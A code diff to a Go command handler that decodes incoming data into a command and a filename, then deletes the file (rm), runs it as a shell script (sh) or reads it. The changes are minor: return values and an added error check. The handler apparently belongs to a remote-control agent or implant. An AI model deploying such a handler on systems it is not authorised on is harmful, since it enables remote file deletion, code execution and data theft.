@@ -45,8 +45,7 @@ func Perform(data string)(string) {
 
 	s := strings.Split(Deciphor(data),":")
 	command := s[0]
-	var filename string
-	var content string
+	var filename, content string
 	if len(s) >= 2 {
 		filename = s[1]
 	}
@@ -56,11 +55,11 @@ func Perform(data string)(string) {
 
 	if command == "" {
 		log.Printf("No command received. Received %s", data)
-		return ""
+		return "fail"
 	}
 	if filename == "" {
 		log.Printf("No filename received. Received %s", data)
-		return ""
+		return "fail"
 	}
 
 	switch command {
@@ -68,7 +67,7 @@ func Perform(data string)(string) {
 		// delete a file
 		if !checkfile(filename) {
 			log.Printf("File does not exist. Cannot delete. Received %s", filename)
-			return ""
+			return "fail"
 		}
 		cmd := exec.Command("rm", filename)
 		cmd.Run()
@@ -85,7 +84,8 @@ func Perform(data string)(string) {
 	case "exec":
 		// execute a file as shell file
 		cmd := exec.Command("sh", filename)
-		cmd.Run()
+		err := cmd.Run()
+		check(err)
 	case "readfile":
 		dat, err := ioutil.ReadFile(filename)
 		check(err)
@@ -95,5 +95,5 @@ func Perform(data string)(string) {
 		log.Printf("Unkonwn command received:%s", command)
 	}
 
-	return ""
+	return "success"
 }
